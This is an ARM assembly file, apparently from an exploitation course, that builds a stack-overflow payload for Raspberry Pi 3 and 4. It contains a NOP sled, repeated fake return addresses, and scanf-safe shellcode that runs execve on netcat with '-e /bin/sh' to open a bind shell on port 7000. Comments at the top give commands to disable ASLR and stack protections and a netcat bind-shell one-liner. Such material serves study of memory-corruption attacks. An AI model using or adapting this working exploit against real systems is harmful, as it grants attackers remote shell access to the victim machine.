// echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

// RPi3:
// /bin/nc -l -p 7000 -c /bin/sh -i
// as -defsym fakerp=0x7EFFF700 -o arm_rpi3.o runshell_arm.S -k
// gcc -g target.c -o target

// RPi4:
// /bin/nc6 -l -p 7000 -e "/bin/sh -i"
// as -defsym fakerp=0xbefff600 -o arm_rpi4.o runshell_arm.S -k
// gcc -g -Wl,-z,norelro -fno-stack-protector -z execstack target.c -o target

// how to compile with stack execution:
// https://security.stackexchange.com/questions/234469/how-can-i-exploit-a-buffer-overflow-on-a-raspberry-pi-4
// gcc -g -no-pie -Wl,-z,norelro -fno-stack-protector -z execstack target.c -o target

// Some usefull links:
// https://samsclass.info/127/proj/ED413.htm
// https://personal.utdallas.edu/~pervin/RPiA/RPiA.pdf
// https://shell-storm.org/online/Online-Assembler-and-Disassembler/
// https://users.ece.utexas.edu/~valvano/Volume1/IntroToEmbSys/AssemblyReference.htm
// https://eclecticlight.co/2021/07/16/code-in-arm-assembly-bit-operations/
// https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization
// https://security.stackexchange.com/questions/234469/how-can-i-exploit-a-buffer-overflow-on-a-raspberry-pi-4

.text

	                // we must export the entry point to the ELF linker or
    .global _start      // loader. They conventionally recognize _start as their
                        // entry point. Use ld -e foo to override the default.

// Jump to actual code in .data section. Actual code shouold be there since it 
// should be allocated with the data that are modified (args). Data cannot be in
// .text (.text is not modifiable) hence code should be in .data

	_start:
	
	ldr r0, =start_nops
	b r0

.data
// representation of the stack
buffer:	.space		16, 'A'		// dummy, it represent the buffer to smash


//       set this from outside using --defsym sym=value option of gnu as
//	.set	fakerp, 0xbffff670   // this is ok for debian sarge, both short and long argv[0]


		
	// we do not know exactly where the %eip is saved 
	// then we put here more than one copy
	// this is a fortunate situtation since the buffer is located very near
	// to the return address, no local variable is affected and hence
	// function finishing is granted

	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp

	
// the data of the payload
data_start:	
	.align		4
args:	//arguments array
pp0:	.asciz    "pp0" // 4 bytes!
pp1:	.asciz    "pp1" // 4 bytes!
pp2:	.asciz    "pp2" // 4 bytes!
pp3:	.asciz    "pp3" // 4 bytes!
pp4:	.asciz    "pp4" // 4 bytes!
pp5:	.asciz    "pp5" // 4 bytes!
pp6:	.long		0

	.ascii		"env>"
env:	.long		0                  // no envinoment 

	.ascii		"arg>"		// 4 bytes keep allignement
	
p0:	.asciz		"/bin/nc6"   // executable to launch with parameters...
p1:	.asciz		"-l"         // listen mode
p2:	.asciz    "-p"		     // port
p3:	.asciz    "7000"		   //   7000
p4:	.asciz    "-e"         // command to execute when connected:	
p5:	.ascii    "/bin/sh"	 //   a shell
p5b:	.asciz	""      //  "!" will be translated into a space
//p5b:	.asciz		"!-i"              //  "!" will be translated into a space

//	.align		4

	.ascii		"nop>"
	.align		4


// the code of the payload
	
start_nops:
//  .space		923, 0x90		// 0x90 is opcode of NOP
        .rept   64
        .long   0xe1a00000
        .endr
        
        b self

lblp0:
        .long  p0-self8
lblp1:
        .long  p1-self8
lblp2:
        .long  p2-self8
lblp3:
        .long  p3-self8
lblp4:
        .long  p4-self8
lblp5:
        .long  p5-self8
lblp5b:
        .long  p5b-self8
lblpp0:
        .long  pp0-self8
lblpp1:
        .long  pp1-self8
lblpp2:
        .long  pp2-self8
lblpp3:
        .long  pp3-self8
lblpp4:
        .long  pp4-self8
lblpp5:
        .long  pp5-self8
lblenv:
        .long  env-self8
        .long  0

// execute the /bin/sh
	
	// get the address of the pop instruction
//	call self
self:
//	pop %ebp
  mov r4, pc
  nop
self8:
  nop

	//set up parameters
	//leal	(p0-self) (%ebp), %ebx	// first argument:  pathname executable
  ldr r7, lblp0 // first argument:  pathname executable
	add r7, r4, r7

	//movl	%ebx, (pp0-self)(%ebp)
	ldr r0, lblpp0
	add r0, r4, r0
	str r7, [r0]

	//leal	(p1-self)(%ebp), %eax
	//movl	%eax, (pp1-self)(%ebp)
	ldr r7, lblp1
	add r7, r4, r7
	ldr r0, lblpp1
	add r0, r4, r0
	str r7, [r0]

	//leal	(p2-self)(%ebp), %eax
	//movl	%eax, (pp2-self)(%ebp)
	ldr r7, lblp2
	add r7, r4, r7
	ldr r0, lblpp2
	add r0, r4, r0
	str r7, [r0]

	//leal	(p3-self)(%ebp), %eax
	//movl	%eax, (pp3-self)(%ebp)
	ldr r7, lblp3
	add r7, r4, r7
	ldr r0, lblpp3
	add r0, r4, r0
	str r7, [r0]

	//leal	(p4-self)(%ebp), %eax
	//movl	%eax, (pp4-self)(%ebp)
	ldr r7, lblp4
	add r7, r4, r7
	ldr r0, lblpp4
	add r0, r4, r0
	str r7, [r0]

	//leal	(p5-self)(%ebp), %eax
	//movl	%eax, (pp5-self)(%ebp)
	ldr r7, lblp5
	add r7, r4, r7
	ldr r0, lblpp5
	add r0, r4, r0
	str r7, [r0]

	//p5b should be traslated into a space
	//decb	(p5b-self)(%ebp)     
//	ldr r0, lblp5b
//	add r0, r4, r0
//	ldrb r7, [r0]
//	sub r7, r7, #1
//	strb r7, [r0]
		
  //leal	(env-self) (%ebp), %edx		// third argument: environment, pointer to array of strings
	ldr r0, lblenv
  add r0, r4, r0	// third argument: environment, pointer to array of strings
  push {r0, r1}	// "mov r2, r0" generate opcode with 0x20, that is not suitable for scanf()...
  pop {r2, r1}

  ldr r0, lblp0
  add r0, r4, r0	// first argument:  pathname executable

	//leal	(args-self) (%ebp), %ecx		// second argument: pointer to array (zero terminated) of strings (zero terminated)
  ldr r1, lblpp0	 // second argument: pointer to array (zero terminated) of strings (zero terminated)
  add r1, r4, r1

	//movl	$111,%eax
	//subl	$100,%eax
	mov r7, #111
	sub r7, r7, #100  // execve syscall #
						// system call number 11 (sys_execve)
						// this fancy way does not introduce white-space chars
	
	eor r4, r4, r4 // clear r4

  #int     $0x80				// call kernel
  svc #0            // invoke syscall
	.ascii "<int"
	.ascii "\n"	//scanf now recognize the end of the field!
